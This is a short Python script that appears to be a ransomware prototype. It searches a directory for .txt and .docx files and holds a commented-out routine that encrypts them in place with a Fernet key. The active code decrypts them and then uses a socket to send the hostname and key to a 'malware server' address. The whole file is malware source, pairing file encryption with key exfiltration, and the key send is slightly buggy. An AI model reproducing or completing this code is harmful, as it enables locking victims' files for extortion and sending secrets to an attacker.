import os 

import random 
import socket 
from threading import Thread
from datetime import datetime
from  queue import  Queue
from cryptography.fernet import Fernet 
safeguard= input("password: ")
if safeguard != 'start':
    quit()

encrypt_ext = ('.txt','.docx',) # comma here gets the specified(txts adn docx)
file_paths = []
for root, dirs, files in os.walk('/workspace/tr-trial/adnan-abe'): #start from c drive grab  the root, then directory then show files
    for file in files :# current test phase works on my wd but gets all the files 
       file_path, file_ext  = os.path.splitext(root+'\\'+ file )
       if file_ext in encrypt_ext:
            file_paths.append(root+'/'+file)

hostname = os.getenv('HOSTNAME')
for i in file_paths: 
    print(i)

#encryption 

# key = Fernet.generate_key()
# with open("thekey.key","wb") as thekey:
#     thekey.write(key)
# for file in file_paths:
#     with open(file,"rb") as thefile:
#         contents = thefile.read()
#     encrypted_content = Fernet(key).encrypt(contents)
#     with open(file,"wb") as thefile:
#         thefile.write(encrypted_content)


#dec
with open("thekey.key","rb") as key:
    secretkey = key.read()
for file in file_paths:
    with open(file,"rb") as thefile:
        contents = thefile.read()
    decrypted_content = Fernet(secretkey).decrypt(contents)
    with open(file,"wb") as thefile:
        thefile.write(decrypted_content)


# #machine ip addres/malware server
ip_addr ='0.0.0.0'

time_rn = datetime.now()

with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
    s.connect((ip_addr,12345))
    s.send(f'[{time_rn}] - {hostname} : {key}'.encode('utf-8'))

